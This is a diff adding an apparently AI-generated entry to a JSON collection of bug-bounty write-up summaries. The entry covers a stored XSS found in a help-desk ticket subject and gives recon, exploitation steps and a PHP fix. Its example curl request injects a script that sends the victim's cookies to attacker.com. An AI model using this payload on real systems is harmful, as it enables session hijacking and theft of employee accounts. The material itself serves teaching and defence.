@@ -1,5 +1,45 @@
 [
   {
+    "id": "70c3e6c30ab9",
+    "title": "The Callback That Arrived at 2 A.M., Eleven Days Later",
+    "url": "https://kd-200.medium.com/the-callback-that-arrived-at-2-a-m-eleven-days-later-aa99c4cd8781",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Nitin yadav"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-09-24T11:31:01.000Z",
+    "added_at": "2026-09-24T11:59:07.261Z",
+    "categories": [
+      "xss"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "A stored XSS payload injected into a support ticket was executed eleven days later in an internal admin console, compromising an employee’s session.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The application accepted user‑provided text in the support ticket subject without sanitising or encoding it. That text was stored in the database and later rendered verbatim in an internal admin interface that employees use to view tickets. Because the admin page did not escape HTML, any injected markup was interpreted by the browser. The lack of output encoding allowed the attacker’s payload to become executable JavaScript. The delayed execution occurred because the ticket sat in a processing queue for days before an agent opened it.",
+      "walkthrough": "RECON\nStep 1: Identify a public support form that accepts a subject or description field.\nWhy: The form is an HTTP request (a message sent from your browser to the server) that includes a parameter you can control.\n\nDISCOVERY\nStep 2: Submit a ticket with a harmless marker in the subject to confirm the field is stored.\nWhy: The marker appears later in the admin view, proving the data is saved.\n\nEXPLOITATION\nStep 3: Resubmit the ticket, this time placing a JavaScript payload (e.g., <script>...</script>) in the subject.\nWhy: The payload is stored unchanged because the server does not filter or encode it.\nStep 4: Wait for the ticket to be processed by the internal queue.\nWhy: The article states the ticket sat in a queue for eleven days before an agent opened it.\nStep 5: When an employee opens the ticket in the internal console (a page whose URL contains “queue”), the stored payload runs in their browser session.\nWhy: The admin page renders the subject without escaping, so the browser executes the script (XSS).",
+      "example": "A fictional help‑desk at target.example has a field called \"subject\" that is saved to the database and later displayed in the admin view at https://admin.target.example/tickets/queue. The vulnerable code:\n```php\necho \"<td>\" . $ticket['subject'] . \"</td>\"; // no escaping\n```\nAttack request (curl example):\n```bash\ncurl -X POST https://target.example/support \\\n  -d \"subject=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\" \\\n  -d \"message=Test\"\n```\nWhy it works: The server stores the raw <script> tag; the admin page prints it directly, causing the browser to execute the JavaScript and send the victim’s cookies to the attacker.",
+      "takeaway": "Stored XSS can hide in seemingly innocuous fields like support ticket subjects and only fire when an internal tool renders them. Hunters should test any user‑controlled input that is later displayed to privileged users, especially in admin consoles or queue pages. Look for delayed callbacks or out‑of‑band DNS/HTTP requests that appear long after submission. Variants include stored XSS in comment systems, email templates, or PDF generators. A common mistake is assuming that because a payload does not fire immediately, it is ineffective.",
+      "fix": "Sanitise or encode all user‑generated content before storing or rendering it. In server‑side templates, use functions that HTML‑escape characters such as <, >, &, \", and '. For example, in PHP use htmlspecialchars($input, ENT_QUOTES, 'UTF-8'). Additionally, implement a Content‑Security‑Policy header that disallows inline scripts. Refactor the admin view to treat the subject as plain text, e.g.,\n```php\necho \"<td>\" . htmlspecialchars($ticket['subject'], ENT_QUOTES, 'UTF-8') . \"</td>\";\n```",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "Computer Science Student | Bug Hunter | Cyber Security Enthusiast | Contact : https://linktr.ee/ydv_nitin writer Member-only story Cybersecurity Bug Bounty Pentesting Security Hacking # The Callback That Arrived at 2 A.M., Eleven Days Later ## You inject into a field and see nothing. Eleven days later it fires in a support console, in an employee’s session. Image 3: Nitin yadav Nitin yadav 9 min read · Just now [](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Faa99c4cd8781&operation=register&redirect=https%3A%2F%2Fkd-200.medium.com%2Fthe-callback-that-arrived-a",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "e6b7d6b3a63e",
     "title": "File Upload XSS Beyond SVG: Four Vectors Validation Misses",
     "url": "https://kd-200.medium.com/file-upload-xss-beyond-svg-four-vectors-validation-misses-3d1cc9df3311",
